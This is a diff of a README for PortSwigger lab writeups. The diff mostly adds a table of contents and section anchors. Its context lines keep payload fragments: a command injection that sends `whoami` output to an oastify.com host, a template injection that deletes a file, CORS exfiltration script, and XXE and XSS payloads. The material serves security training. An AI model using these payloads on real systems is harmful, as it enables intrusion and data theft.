@@ -1,12 +1,36 @@
 
-# Portswigger-Labs
+# Portswigger Labs Writeups
 
-All Apprentice and Practitioner-level Portswigger labs. 
+All Apprentice and Practitioner-level Portswigger labs, each detailed writeup is in the Markdown files.
 
-In this README file you can find the final payloads, each detailed writeup is in the Markdown files. 
+In this README.md file you can find the final payloads for each section, and a final section regarding the vulnerability type for each step of the exam:
 
-1. [01 - SQL Injection](#1)
-2. [02 - Cross-Site Scripting](#2)
+- [01 - SQL Injection](#1)
+- [02 - Cross-Site Scripting](#2)
+- [03 - Cross-site request forgery (CSRF)](#3)
+- [04 - Clickjacking](#4)
+- [05 - DOM-based vulnerabilities](#5)
+- [06 - Cross-origin resource sharing (CORS)](#6)
+- [07 - XML external entity (XXE) injection](#7)
+- [08 - Server-side request forgery (SSRF)](#8)
+- [09 - HTTP request smuggling](#9)
+- [10 - OS command injection](#10)
+- [11 - Server-side template injection (SSTI)](#11)
+- [12 - Directory traversal](#12)
+- [13 - Access control vulnerabilities](#13)
+- [14 - Authentication](#14)
+- [15 - WebSockets](#15)
+- [16 - Web cache poisoning](#16)
+- [17 - Insecure deserialization](#17)
+- [18 - Information disclosure](#18)
+- [19 - Business logic vulnerabilities](#19)
+- [20 - HTTP Host header attacks](#20)
+- [21 - OAuth authentication](#21)
+- [22 - File upload vulnerabilities](#22)
+- [23 - JWT](#23)
+- [24 - Essential skills](#24)
+- [25 - Prototype pollution](#25)
+- [Exam steps](#26)
 
 
 ## <a name="1"></a>01 - SQL Injection
@@ -364,7 +388,7 @@ ${alert(1)}
 
 
 
-## 03 - Cross-site request forgery (CSRF)
+## <a name="3"></a>03 - Cross-site request forgery (CSRF)
 
 01 - CSRF vulnerability with no defenses
 
@@ -566,9 +590,7 @@ Referrer-Policy: unsafe-url
 ```
 
 
-## 04 - Clickjacking
-
-
+## <a name="4"></a>04 - Clickjacking
 
 #### CJACK.01 - Basic clickjacking with CSRF token protection
 
@@ -745,8 +767,7 @@ Referrer-Policy: unsafe-url
 ```
 
 
-## 05 - DOM-based vulnerabilities
-
+## <a name="5"></a>05 - DOM-based vulnerabilities
 
 #### DOM.01 - DOM XSS using web messages
 
@@ -785,7 +806,7 @@ Referrer-Policy: unsafe-url
 
 
 
-## 06 - Cross-origin resource sharing (CORS)
+## <a name="6"></a>06 - Cross-origin resource sharing (CORS)
 
 #### CORS.01 - CORS vulnerability with basic origin reflection
 
@@ -843,7 +864,7 @@ var payload = "var req = new XMLHttpRequest();var url = (\"https://0a7b003603ae3
 
 
 
-## 07 - XML external entity (XXE) injection
+## <a name="7"></a>07 - XML external entity (XXE) injection
 
 #### XXE.01 - Exploiting XXE using external entities to retrieve files
 
@@ -959,7 +980,7 @@ productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+pa
 
 
 
-## 08 - Server-side request forgery (SSRF)
+## <a name="8"></a>08 - Server-side request forgery (SSRF)
 
 #### SSRF.01 - Basic SSRF against the local server
 
@@ -1011,7 +1032,7 @@ Referer: http://snjtorvmsesj9itkltcgrqtsfjla92xr.oastify.com
 
 
 
-## 09 - HTTP request smuggling
+## <a name="9"></a>09 - HTTP request smuggling
 
 #### HSMU.01 - HTTP request smuggling, basic CL.TE vulnerability
 
@@ -1321,7 +1342,7 @@ Foo: x
 ```
 
 
-## 10 - OS command injection
+## <a name="10"></a>10 - OS command injection
 
 
 #### CINJ.01 - OS command injection, simple case
@@ -1365,7 +1386,7 @@ $(nslookup `whoami`.m1o5mfx5jf0maqi4nblfw9gpdgj774vt.oastify.com)
 ```
 
 
-## 11 - Server-side template injection (SSTI)
+## <a name="11"></a>11 - Server-side template injection (SSTI)
 
 #### SSTI.01 - Basic server-side template injection
 
@@ -1407,7 +1428,7 @@ ${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
 
 
 
-## 12 - Directory traversal
+## <a name="12"></a>12 - Directory traversal
 
 
 #### TRAV.01 - File path traversal, simple case
@@ -1454,7 +1475,7 @@ ${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
 
 
 
-## 13 - Access control vulnerabilities
+## <a name="13"></a>13 - Access control vulnerabilities
 
 
 #### ACCE.01 - Unprotected admin functionality
@@ -1543,7 +1564,7 @@ Referer: https://0afd00fc039e68c881769dfa009b00b8.web-security-academy.net/admin
 ```
 
 
-## 14 - Authentication
+## <a name="14"></a>14 - Authentication
 
 
 #### AUTH.01 - Username enumeration via different responses
@@ -1631,7 +1652,7 @@ username=carlos
 There is a function to update the password, it generates a POST request with the username and current password as parameters. When the current password is correct but the new passwords are different the message is different that when the new passwords do not match and the current password is wrong.
 
 
-## 15 - WebSockets
+## <a name="15"></a>15 - WebSockets
 
 #### WSOCK.01 - Manipulating WebSocket messages to exploit vulnerabilities
 
@@ -1662,7 +1683,7 @@ ScRIpT><iMg sRc=x OnErRoR=alert`1`>
 ```
 
 
-## 16 - Web cache poisoning
+## <a name="16"></a>16 - Web cache poisoning
 
 
 #### WCACH.01 - Web cache poisoning with an unkeyed header
@@ -1796,7 +1817,7 @@ Use the URL-encoded version of /<script>alert(1)</script> (they have the same ca
 ```
 
 
-## 17 - Insecure deserialization
+## <a name="17"></a>17 - Insecure deserialization
 
 
 #### DESE.01 - Modifying serialized objects
@@ -1873,7 +1894,7 @@ Cookie: session=BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJl
 ```
 
 
-## 18 - Information disclosure
+## <a name="18"></a>18 - Information disclosure
 
 #### INFD.01 - Information disclosure in error messages
 
@@ -1924,7 +1945,7 @@ cat admin.conf
 
 
 
-## 19 - Business logic vulnerabilities
+## <a name="19"></a>19 - Business logic vulnerabilities
 
 #### BUSL.01 - Excessive trust in client-side controls
 
@@ -2006,7 +2027,7 @@ W0Qhvki0tOhz7V7DD4c7gUE5MQ/KEsTNpdy4UQnWdyE=
 W0Qhvki0tOhz7V7DD4c7gUE5MQ/KEsTNpdy4UQnWdyE%3d
 ```
 
-## 20 - HTTP Host header attacks
+## <a name="20"></a>20 - HTTP Host header attacks
 
 
 #### HOST.01 - Basic password reset poisoning
@@ -2077,7 +2098,7 @@ username=carlos&csrf=CY6qJXGEMwYMKu0z18mEKfFo2zAoE866
 ```
 
 
-## 21 - OAuth authentication
+## <a name="21"></a>21 - OAuth authentication
 
 #### OAUTH.01 - Authentication bypass via OAuth implicit flow
 
@@ -2148,7 +2169,7 @@ GET /client/m7xK68ZFDecUNKJ6U91xk/logo
 
 
 
-## 22 - File upload vulnerabilities
+## <a name="22"></a>22 - File upload vulnerabilities
 
 #### UPLD.01 - Remote code execution via web shell upload
 
@@ -2232,7 +2253,7 @@ Content-Type: text/php
 
 
 
-## 23 - JWT
+## <a name="23"></a>23 - JWT
 
 #### JWT.01 - JWT authentication bypass via unverified signature
 
@@ -2297,7 +2318,7 @@ Create a JWT with this header and no secret in jwt.io:
 ```
 
 
-## 24 - Essential skills
+## <a name="24"></a>24 - Essential skills
 
 #### ESSE.01 - Discovering vulnerabilities quickly with targeted scanning
 
@@ -2313,7 +2334,7 @@ productId=%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%
 ```
 
 
-## 25 - Prototype pollution
+## <a name="25"></a>25 - Prototype pollution
 
 
 #### PROPO.01 - DOM XSS via client-side prototype pollution
@@ -2399,7 +2420,7 @@ POST /my-account/change-address HTTP/2
 
 ```
 
-## Exam steps
+## <a name="26"></a>Exam steps
 
 Source: [https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/)
 
